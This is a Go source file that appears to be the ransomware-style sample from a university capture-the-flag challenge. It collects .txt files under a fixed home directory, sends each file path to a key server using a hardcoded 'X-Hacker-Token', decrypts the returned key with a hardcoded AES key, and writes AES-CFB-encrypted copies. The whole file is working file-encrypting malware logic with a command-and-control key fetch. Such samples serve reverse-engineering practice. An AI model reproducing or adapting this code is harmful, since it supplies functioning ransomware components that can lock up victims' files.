package encryptutils

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
)

type receivedtoken struct {
	Token string
}

func Decryptkey(data string) string {
	ct, _ := base64.StdEncoding.DecodeString(data)
	key := "dWFoe2szeV8zbmNyeXA3XzFuZ19rM3l9"
	block, _ := aes.NewCipher([]byte(key))

	if len(ct) < aes.BlockSize {
		return ""
	}

	iv := ct[:aes.BlockSize]
	ct = ct[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ct, ct)

	return string(ct)
}

func EncryptFile(file string) {
	data, err := os.ReadFile(file)
	bytes := []byte(data)

	if err != nil {
		panic(nil)
	}

	client := http.Client{}

	form := url.Values{}
	form.Add("file", file)
	req, _ := http.NewRequest("POST", "http://localhost:5000/api/get_signing_key", strings.NewReader(form.Encode()))
	//req, _ := http.NewRequest("POST", "http://chal.ctf.uahcyber.club:5502", nil)
	req.Header.Set("X-Hacker-Token", "jo7aiXieShaephaevi4Ohvengiey0kah")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	res, err := client.Do(req)
	if err != nil {
		return 
	}

	defer res.Body.Close()
	body, _ := io.ReadAll(res.Body)

	var decoded receivedtoken
	err = json.Unmarshal(body, &decoded)
	if err != nil {
		panic(err)
	}

	if decoded.Token == "" {
		panic("Token was empty")
	}

	decoded_key := Decryptkey(decoded.Token)

	block, err := aes.NewCipher([]byte(decoded_key)[:16])
	if err != nil {
		panic(err)
	}
	ct := make([]byte, aes.BlockSize+len(bytes))
	iv := ct[:aes.BlockSize]

	io.ReadFull(rand.Reader, iv)
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ct[aes.BlockSize:], bytes)

	path := strings.Split(file, "/")
	path[len(path)-1] = "encrypted_"+path[len(path)-1]
	file = strings.Join(path, "/")
	f, err := os.Create(file)
	if err != nil {
		panic(err)
	}
	f.Write(ct)
	return
}

func Findfiles() []string {
	var files []string
	root := "/home/veryspecificdir/"
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
		}
		if filepath.Ext(path) == ".txt" {
			files = append(files, path)
		}
		return nil
	})
	return files
}
